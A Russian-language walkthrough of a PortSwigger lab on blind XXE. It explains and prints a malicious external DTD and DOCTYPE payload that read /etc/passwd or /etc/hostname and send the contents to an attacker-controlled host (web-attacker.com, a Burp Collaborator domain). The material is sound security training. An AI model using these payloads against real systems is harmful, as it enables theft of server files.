# Exploiting blind XXE to exfiltrate data using a malicious external DTD

## Theory

<h3>Использование слепого XXE для внеполосной эксфильтрации данных</h3>

Обнаружение слепой XXE-уязвимости с помощью внеполосных методов — это очень хорошо, но на самом деле это не демонстрирует, как можно использовать эту уязвимость. Чего на самом деле хочет добиться злоумышленник, так это эксфильтрации конфиденциальных данных. Это может быть достигнуто с помощью слепой уязвимости XXE, но при этом злоумышленник размещает вредоносное DTD в системе, которую он контролирует, а затем вызывает внешнее DTD из внутриполосной полезной нагрузки XXE.

Ниже приведен пример вредоносного DTD для эксфильтрации содержимого файла /etc/passwd:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Это DTD выполняет следующие шаги:

* Определяет сущность параметра XML, называемую файлом, содержащую содержимое файла /etc/passwd.
* Определяет сущность параметра XML с именем eval, содержащую динамическое объявление другой сущности параметра XML с именем exfiltrate. Объект exfiltrate будет оцениваться путем отправки HTTP-запроса к веб-серверу злоумышленника, содержащего значение файлового объекта в строке запроса URL.
* Использует сущность eval, которая вызывает выполнение динамического объявления сущности exfiltrate.
* Использует объект exfiltrate, чтобы его значение оценивалось путем запроса указанного URL-адреса.

Затем злоумышленник должен разместить вредоносное DTD в системе, которую он контролирует, обычно загружая его на свой собственный веб-сервер. Например, злоумышленник может отправить вредоносное DTD по следующему URL-адресу:
```
http://web-attacker.com/malicious.dtd
```

Наконец, злоумышленник должен отправить уязвимому приложению следующую полезную нагрузку XXE:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

Эта полезная нагрузка XXE объявляет сущность параметра XML с именем xxe, а затем использует сущность в DTD. Это заставит синтаксический анализатор XML получить внешнее DTD с сервера злоумышленника и интерпретировать его как встроенное. Затем выполняются шаги, определенные в вредоносном DTD, и файл /etc/passwd передается на сервер злоумышленника.

Этот метод может не работать с некоторым содержимым файла, включая символы новой строки, содержащиеся в файле /etc/passwd. Это связано с тем, что некоторые синтаксические анализаторы XML извлекают URL-адрес из определения внешней сущности с помощью API, который проверяет символы, которые разрешено использовать в URL-адресе. В этой ситуации можно использовать протокол FTP вместо HTTP. Иногда невозможно извлечь данные, содержащие символы новой строки, поэтому вместо этого может быть выбран файл, такой как /etc/hostname.

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_exfiltrate_data_using_a_malicious_external_DTD/assets/1.png)

Выберем любой продукт.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_exfiltrate_data_using_a_malicious_external_DTD/assets/2.png)

Перейдем на его страницу и спустимся в самый низ.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_exfiltrate_data_using_a_malicious_external_DTD/assets/3.png)

Нажмем на кнопку "Check stock" и перехватим запрос. Отправляем его в Repeater.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_exfiltrate_data_using_a_malicious_external_DTD/assets/4.png)

Запустим Burp Collaborator Client. Скопируем DNS.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_exfiltrate_data_using_a_malicious_external_DTD/assets/5.png)

У нас есть подготовленный exploit server. Перейдем к нему.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_exfiltrate_data_using_a_malicious_external_DTD/assets/6.png)

В поле Body впишем наш эксплоит, который будет вызываться с помощью XXE. Вставляем скопированный ранее DNS. Код эксплоита:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ufd9r1q5c1qll4a9tah06npuelkb80.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_exfiltrate_data_using_a_malicious_external_DTD/assets/7.png)

Затем скопируем URL-адрес ведущий на наш эксплоит.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_exfiltrate_data_using_a_malicious_external_DTD/assets/8.png)

Модифицируем запрос. Вставляем скопированный URL-адрес. Отправляем запрос. Код экплоита:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a1100b903877a54c0d52ce9011c0043.web-security-academy.net/exploit"> %xxe;]>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_exfiltrate_data_using_a_malicious_external_DTD/assets/9.png)

Перейдем в Burp Collaborator Client. теперь мы можем заметить результат DNS lookup.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_exfiltrate_data_using_a_malicious_external_DTD/assets/10.png)

Подтверждаем ответ и получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_blind_XXE_to_exfiltrate_data_using_a_malicious_external_DTD/assets/11.png)
